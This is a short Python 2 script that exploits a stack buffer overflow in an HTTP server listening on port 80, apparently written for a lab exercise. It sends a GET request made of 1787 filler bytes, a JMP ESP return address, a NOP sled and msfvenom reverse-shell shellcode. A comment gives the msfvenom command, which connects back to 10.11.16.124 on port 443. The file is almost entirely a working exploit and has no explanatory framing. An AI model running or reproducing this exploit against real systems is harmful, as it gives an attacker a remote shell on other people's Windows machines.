#!/usr/bin/env python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 80
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.16.124 LPORT=443 EXITFUNC=thread --arch x86 --platform windows -f c -b '\x00\x0d'
shellcode = (
"\xda\xc8\xd9\x74\x24\xf4\xbb\x54\xa9\x7b\xc4\x5a\x29\xc9\xb1"
"\x52\x31\x5a\x17\x83\xc2\x04\x03\x0e\xba\x99\x31\x52\x54\xdf"
"\xba\xaa\xa5\x80\x33\x4f\x94\x80\x20\x04\x87\x30\x22\x48\x24"
"\xba\x66\x78\xbf\xce\xae\x8f\x08\x64\x89\xbe\x89\xd5\xe9\xa1"
"\x09\x24\x3e\x01\x33\xe7\x33\x40\x74\x1a\xb9\x10\x2d\x50\x6c"
"\x84\x5a\x2c\xad\x2f\x10\xa0\xb5\xcc\xe1\xc3\x94\x43\x79\x9a"
"\x36\x62\xae\x96\x7e\x7c\xb3\x93\xc9\xf7\x07\x6f\xc8\xd1\x59"
"\x90\x67\x1c\x56\x63\x79\x59\x51\x9c\x0c\x93\xa1\x21\x17\x60"
"\xdb\xfd\x92\x72\x7b\x75\x04\x5e\x7d\x5a\xd3\x15\x71\x17\x97"
"\x71\x96\xa6\x74\x0a\xa2\x23\x7b\xdc\x22\x77\x58\xf8\x6f\x23"
"\xc1\x59\xca\x82\xfe\xb9\xb5\x7b\x5b\xb2\x58\x6f\xd6\x99\x34"
"\x5c\xdb\x21\xc5\xca\x6c\x52\xf7\x55\xc7\xfc\xbb\x1e\xc1\xfb"
"\xbc\x34\xb5\x93\x42\xb7\xc6\xba\x80\xe3\x96\xd4\x21\x8c\x7c"
"\x24\xcd\x59\xd2\x74\x61\x32\x93\x24\xc1\xe2\x7b\x2e\xce\xdd"
"\x9c\x51\x04\x76\x36\xa8\xcf\x73\xcc\xa2\x73\xec\xd0\xc2\x8a"
"\x57\x5d\x24\xe6\xb7\x08\xff\x9f\x2e\x11\x8b\x3e\xae\x8f\xf6"
"\x01\x24\x3c\x07\xcf\xcd\x49\x1b\xb8\x3d\x04\x41\x6f\x41\xb2"
"\xed\xf3\xd0\x59\xed\x7a\xc9\xf5\xba\x2b\x3f\x0c\x2e\xc6\x66"
"\xa6\x4c\x1b\xfe\x81\xd4\xc0\xc3\x0c\xd5\x85\x78\x2b\xc5\x53"
"\x80\x77\xb1\x0b\xd7\x21\x6f\xea\x81\x83\xd9\xa4\x7e\x4a\x8d"
"\x31\x4d\x4d\xcb\x3d\x98\x3b\x33\x8f\x75\x7a\x4c\x20\x12\x8a"
"\x35\x5c\x82\x75\xec\xe4\xa2\x97\x24\x11\x4b\x0e\xad\x98\x16"
"\xb1\x18\xde\x2e\x32\xa8\x9f\xd4\x2a\xd9\x9a\x91\xec\x32\xd7"
"\x8a\x98\x34\x44\xaa\x88")

# OFFSET 1787  7781E871 JMP ESP
#req1 = "GET " + "/shared/vivalepen.txt" + " HTTP/1.1\r\n\r\n"
req1 = "GET " + "A"*1787 + "\x71\xe8\x81\x77" + "\x90"*16 + shellcode + " HTTP/1.1\r\n\r\n"
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     #print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
